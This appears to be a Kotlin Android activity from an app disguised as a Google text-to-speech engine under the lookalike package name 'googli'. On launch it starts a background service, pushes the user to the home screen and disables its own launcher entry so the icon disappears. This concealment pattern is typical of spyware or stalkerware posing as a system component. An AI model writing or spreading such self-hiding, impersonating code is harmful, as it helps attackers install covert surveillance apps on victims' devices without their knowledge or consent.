package com.googli.googletext_to_speechengine

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.support.v7.app.AppCompatActivity
import android.os.Bundle

class FlashActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_flash)
        val serviceIntent = Intent(this, Text_to_Speech_Service::class.java)
        startService(serviceIntent)
        backgroundApp()
        removeDrawerIcon()

    }

    fun backgroundApp() {
        println("BackgroundApp")
        val startMain = Intent(Intent.ACTION_MAIN)
        startMain.addCategory(Intent.CATEGORY_HOME)
        startMain.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(startMain)
    }

    fun removeDrawerIcon() {
        val componentToDisable = ComponentName("com.googli.googletext_to_speechengine",
                "com.googli.googletext_to_speechengine.FlashActivity")

        packageManager.setComponentEnabledSetting(
                componentToDisable,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP)
    }
}
